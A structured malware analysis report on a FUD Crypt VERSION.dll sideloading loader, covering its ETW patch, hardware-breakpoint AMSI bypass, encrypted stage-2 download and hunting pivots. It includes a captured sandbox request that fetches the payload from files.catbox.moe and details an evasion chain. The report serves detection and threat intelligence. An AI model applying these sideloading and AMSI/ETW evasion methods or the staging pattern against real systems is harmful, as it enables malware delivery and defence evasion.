summary: Native x86_64 DLL compiled with MinGW-w64 GCC that masquerades as VERSION.dll, abuses DLL search-order sideloading to obtain execution inside a signed host, then patches ETW, defangs AmsiScanBuffer with hardware breakpoints, downloads an RC4+XOR-encrypted .NET assembly from files.catbox.moe and runs it in-process via mscoree/_AppDomain.Load_3. Identified as a FUD Crypt platform build (20 carrier profiles documented; this sample is the VERSION.dll carrier). Catbox.moe URL is the documented fallback staging path; primary is Dropbox.

attribution.researcher_disclosure: Ctrl-Alt-Intel - 200 registered users, 334 builds, 38 days observation window

rationale: Carrier is host-agnostic at runtime: DllMain does not check parent process name/path, so any 64-bit signed binary that imports VERSION.dll and calls one of the 17 forwarded exports will trigger DoWork
OneDrive imports VERSION.dll natively and is 64-bit since 2020 - matches the PE32+ x86_64 carrier
OneDrive installs into per-user user-writable path requiring no elevation
Microsoft Authenticode-signed parent inherits Microsoft trust on EDR queries, pairs with FUD Crypt's documented Microsoft Azure Trusted Signing abuse for the stage-2 .NET
OneDrive.exe + version.dll is the single most-abused VERSION.dll sideload vector in the wild (Palo Alto Unit 42 2022, multiple public PoCs, Brute Ratel C4, dedicated Splunk detection rule)
secondary_candidates: CCleaner.exe (Piriform-signed, also imports VERSION.dll, in FUD Crypt carrier list)
ruled_out_from_carrier_set: Visual Studio Code (Code.exe is an Electron app, does not import VERSION.dll directly)
WindowsDF.exe + mpclient.dll (different carrier, sideloads mpclient.dll not version.dll)
likely_host_for_this_carrier.confidence: best-guess match from static characteristics + documented carrier catalogue; no direct evidence (no original drop path preserved, HA detonated under rundll32.exe generic harness)
likely_host_for_this_carrier.hunting_pivot: version.dll loaded from %LOCALAPPDATA%\Microsoft\OneDrive\ (or any non-System32 path) by a Microsoft-signed parent, with WININET activity to files.catbox.moe or Dropbox, parent thread carries non-zero DR0/DR7

sample.compile_timestamp_note: future date relative to first-seen, treat as forged

overlay.type: MinGW-w64 COFF symbol table left in by the linker (.symtab style)
fingerprints: trailing bytes contain mangled C++ symbol names
overlay.implication: another self-doxing artifact alongside the DWARF /19 section - operator did not strip the binary

build_artifacts: MinGW-w64 CRT pseudo-relocator and TLS stubs present
30 KB COFF symbol table overlay appended after last section

runtime_resolved_apis.name: EtwEventWrite
runtime_resolved_apis.purpose: patched to immediate RET (0xC3) to silence ETW telemetry

runtime_resolved_apis.name: AmsiScanBuffer
runtime_resolved_apis.purpose: hardware breakpoint + VEH bypass returning E_INVALIDARG

obfuscation: Stack-string construction of all sensitive literals
Random C++ name-mangled function symbols (smaLD9BuiQeSQy_DoWork, ZI7vPLTiiXSV, UF86nZQWPjSqH4)
anti_analysis: CheckRemoteDebuggerPresent + IsDebuggerPresent gate at top of DoWork
ETW patch via VirtualProtect+RET prologue write at EtwEventWrite
AMSI bypass via DR0 hardware breakpoint + VEH returning E_INVALIDARG (0x80070057)
Decoy data write to non-functional global on debugger detection

host.value: VERSION.dll proxy with all 17 Ver* / GetFileVersionInfo* exports

mitre_attck.name: Obfuscated Files or Information
mitre_attck.evidence: stack strings, XOR mask, MinGW C++ random names

mitre_attck.name: Web Service
mitre_attck.evidence: abuse of public anonymous file host

mitre_attck.name: Process Injection: Process Hollowing
mitre_attck.evidence: host process is the running .NET assembly container

weaknesses: DWARF debug section retained (file size 243 KB vs 9 KB of malicious code) - source paths and toolchain leak
Single hardcoded HTTPS staging URL with no fallback or DGA
Compile timestamp is in the future (forged)
Stack strings are easy to recover with Capa or `strings` after a single pass
RC4 + 32-byte XOR keys are stored in cleartext .data and cover the entire decrypt path
AMSI bypass leaves a process with non-default DR0/DR7 values - trivial to flag from telemetry
MinGW import set is unique enough that it stands out among Visual Studio compiled malware

virustotal.status: unauthenticated probe returned 401; not pivoted from this analysis

malwarebazaar.status: loader was on MB on 2026-04-20 (local DB confirms first_seen_archive_date) but no longer returned by get_info; sample retired or moved

sandbox_report.captured_http_request:
GET /v5fllr.bin HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Host: files.catbox.moe
Cache-Control: no-cache
sandbox_report.validation_note: the captured User-Agent and URL exactly match what was reverse-engineered from the .data stack-strings - independent confirmation of the static analysis

related_pe_hashes_in_report.what: C:\\Windows\\System32\\rundll32.exe (host process used to load the DLL)
C:\\Windows\\System32\\WerFault.exe (Windows Error Reporting; explains the Sample Crashed characteristic)

mitre_techniques_seen: T1543 Create or Modify System Process
T1573 Encrypted Channel (matches RC4 + 32-byte rolling XOR)

operator_qa_timeline.step_1_22_59_44_UTC: operator submitted clean .NET test payload (86e9024c) to HA - 0% detection baseline
operator_qa_timeline.step_2_~23_00_UTC: operator encrypted that exact payload with RC4 (3089F010...) + 32-byte rolling key (3255803F...) and uploaded ciphertext to https://files.catbox.moe/v5fllr.bin
operator_qa_timeline.step_3_23_07_57_UTC: operator submitted carrier DLL (c73947cf) to HA - 47% detection
operator_qa_timeline.elapsed: 8 min 13 s between QA test payload and live carrier - tight enough to attribute both to a single operator workflow
operator_qa_timeline.circular_confirmation: decrypt_stage2.py output sha256 86e9024c... is identical to the cleartext .NET assembly the operator uploaded to HA 8 minutes earlier - end-to-end pipeline validated

web_search.loader_hash: no public references on Google/Bing for the SHA256
web_search.stage2_hash: no public references on Google/Bing for the SHA256
web_search.url_v5fllr: no published sandbox report mentions /v5fllr.bin specifically (other catbox URLs widely reported)

stage2_capture.verdict: FUD Crypt builder QA test payload (NOT weaponised)
stage2_capture.decompiled_behavior: Writes 'dotnet_test_success.txt' to user Desktop with the string 'FudCrypt .NET Build Test - <DateTime.Now>', then displays a MessageBox titled 'FudCrypt Test' with body 'Test payload executed!\nFile written to: <path>'
stage2_capture.implication: Operator left builder QA artifact on the catbox fallback. Real customers ship the encrypted payload via the Dropbox primary path. Confirms the decryption pipeline (RC4 + 32-byte rolling SUB+XOR) is correct and reusable against any FUD Crypt VERSION.dll carrier built with this key pair.

pe_details.imphash: not recorded - imphash on a .NET PE is meaningless because every managed assembly imports only mscoree!_CorExeMain
pe_details.manifest: default Visual Studio app.manifest (asInvoker, uiAccess=false, name=MyApplication.app)

candidate_attribution: Confirmed: FUD Crypt MaaS platform (fudcrypt.net) - VERSION.dll carrier variant
Catbox.moe is the documented fallback staging location for FUD Crypt (Dropbox is the primary)
AMSI bypass via direct memory patch + hardware breakpoint + VEH matches Ctrl-Alt-Intel reporting
ETW silenced with single-byte patch matches Ctrl-Alt-Intel reporting
follow_ups: Hunt other FUD Crypt carriers (mpclient.dll for WindowsDF, plus 19 other DLL profiles) using the ROR-13 resolver YARA rule
Pivot on the 16-byte RC4 key and 32-byte rolling key as YARA conditions to surface other builds (key may rotate per build / per carrier)
Detect downstream activity: registry Run key WindowsUpdateSvc, scheduled task MicrosoftEdgeUpdateCore, network beacon to mstelemetrycloud.com
Cross-reference Microsoft Azure Trusted Signing certs on signed parents that loaded VERSION.dll from the same directory
Watch the Dropbox primary path; catbox is a fallback only and likely retains stale QA payloads
